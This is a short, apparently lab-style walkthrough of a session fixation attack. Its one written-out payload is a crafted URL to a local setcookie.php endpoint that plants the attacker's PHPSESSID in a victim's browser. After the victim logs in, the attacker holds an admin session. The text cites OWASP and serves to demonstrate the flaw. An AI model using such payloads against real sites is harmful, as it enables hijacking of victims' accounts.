1. Hacker get session
2. CSRF payload for set cookie: http://127.0.0.1:1337/setcookie.php?key=PHPSESSID&value=30umbimjpad6m2afnafbsnbmi1&submit=Submit
3. Victim open's url, got hacker's session cookie
4. Victim login
5. Hacker refresh page and bo0om! He is Admin!


https://www.owasp.org/index.php/Session_fixation 